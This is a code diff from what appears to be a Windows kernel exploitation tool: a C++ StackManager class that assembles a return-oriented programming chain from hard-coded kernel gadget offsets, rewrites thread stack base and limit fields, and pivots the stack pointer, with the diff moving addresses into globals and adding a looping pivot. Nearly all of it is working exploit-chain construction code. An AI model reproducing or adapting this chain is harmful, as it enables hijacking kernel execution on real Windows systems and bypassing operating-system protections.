@@ -1,5 +1,6 @@
 #include <include/stack/stack_manager.hpp>
 #include <include/utils/utils.hpp>
+#include <include/globals.hpp>
 
 std::uint64_t* StackManager::GetStackBuffer()
 {
@@ -80,7 +81,7 @@ void StackManager::ModifyThreadStackBaseAndLimit(const std::uint64_t NewStackBas
 	this->ModifyThreadField(EThreadStackLimitOffset, NewStackLimit);
 }
 
-void StackManager::PivotStackIntoEthread(StackManager* StackToPivot, void* StackLimitStoreAddress, void* CurrentStackOffsetAddress, void* DummyMemoryAllocation)
+void StackManager::PivotToNewStack(StackManager* NewStack)
 {
     // TODO: Remove this from here
     const std::string WindowsBuild = Utils::GetWindowsDisplayVersion();
@@ -95,7 +96,7 @@ void StackManager::PivotStackIntoEthread(StackManager* StackToPivot, void* Stack
     // rdx = stack limit store address
     this->AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
     this->AddPadding(0x10);
-    this->AddValue((std::uint64_t)StackLimitStoreAddress, "stack limit store address");
+    this->AddValue((std::uint64_t)Globals::StackLimitStoreAddress, "stack limit store address");
     this->AddPadding(0x8);
 
     // dereference rax, so that rax = stack limit
@@ -108,7 +109,7 @@ void StackManager::PivotStackIntoEthread(StackManager* StackToPivot, void* Stack
     // sets rax to either 'rax + 0x2000' or 'rax + 0x4000' depending on i % 2.
     // read the value of the current stack offset global variable
     this->AddGadget(0xbac75b, "mov rax, qword ptr \[rsp\]; mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
-    this->AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr");
+    this->AddValue((std::uint64_t)Globals::CurrentStackOffsetAddress, "current stack offset addr");
     this->AddPadding(0x18);
     this->AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");
     // rcx=0
@@ -137,16 +138,16 @@ void StackManager::PivotStackIntoEthread(StackManager* StackToPivot, void* Stack
     // to a valid memory dummy pool so that it writes there.
     this->AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
     this->AddPadding(0x10);
-    this->AddValue((uint64_t)DummyMemoryAllocation, "rdx = dummy pool allocation");
+    this->AddValue((uint64_t)Globals::DummyMemoryAllocation, "rdx = dummy pool allocation");
     this->AddPadding(0x8);
     this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
-    this->AddValue((uint64_t)DummyMemoryAllocation, "r8 = dummy pool allocation");
+    this->AddValue((uint64_t)Globals::DummyMemoryAllocation, "r8 = dummy pool allocation");
     this->AddPadding(0x28);
     this->AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
 
     this->AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
     this->AddPadding(0x10);
-    this->AddValue((std::uint64_t)StackToPivot->StackAllocAddress, "src address");
+    this->AddValue((std::uint64_t)NewStack->StackAllocAddress, "src address");
     this->AddPadding(0x8);
     this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
     this->AddValue(0x2000, "count value");
@@ -169,7 +170,7 @@ void StackManager::PivotStackIntoEthread(StackManager* StackToPivot, void* Stack
     // and add it to rax. so rax = stacklimit + curr_stack_offset
     this->AddGadget(0x29cc0e, "push rax; pop rbx; ret;");
     this->AddGadget(0xbac75b, "mov rax, qword ptr \[rsp\]; mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
-    this->AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr");
+    this->AddValue((std::uint64_t)Globals::CurrentStackOffsetAddress, "current stack offset addr");
     this->AddPadding(0x18);
     this->AddGadget(0x27af45, "mov rax, qword ptr [rax]; ret;");
     this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
@@ -187,10 +188,10 @@ void StackManager::PivotStackIntoEthread(StackManager* StackToPivot, void* Stack
         this->AddPadding(0x28);
     this->AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
     this->AddPadding(0x10);
-    this->AddValue((uint64_t)DummyMemoryAllocation, "rdx = dummy pool allocation");
+    this->AddValue((uint64_t)Globals::DummyMemoryAllocation, "rdx = dummy pool allocation");
     this->AddPadding(0x8);
     this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
-    this->AddValue((uint64_t)DummyMemoryAllocation, "r8 = dummy pool allocation");
+    this->AddValue((uint64_t)Globals::DummyMemoryAllocation, "r8 = dummy pool allocation");
     this->AddPadding(0x28);
     this->AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
     // r11=rcx
@@ -203,10 +204,15 @@ void StackManager::PivotStackIntoEthread(StackManager* StackToPivot, void* Stack
     this->AddPadding(0x18);
     this->AddGadget(0xbac765, "mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
     this->AddPadding(0x10);
-    this->AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr (to xor)");
+    this->AddValue((std::uint64_t)Globals::CurrentStackOffsetAddress, "current stack offset addr (to xor)");
     this->AddPadding(0x8);
     this->AddGadget(0x43d5e8, "xor qword ptr [rdx], rax; ret;");
 
     // perform pivot, rsp=r11
     this->AddGadget(0x533eda, "mov rsp, r11; ret;");
+}
+
+void StackManager::LoopBack()
+{
+    this->PivotToNewStack(this);
 }
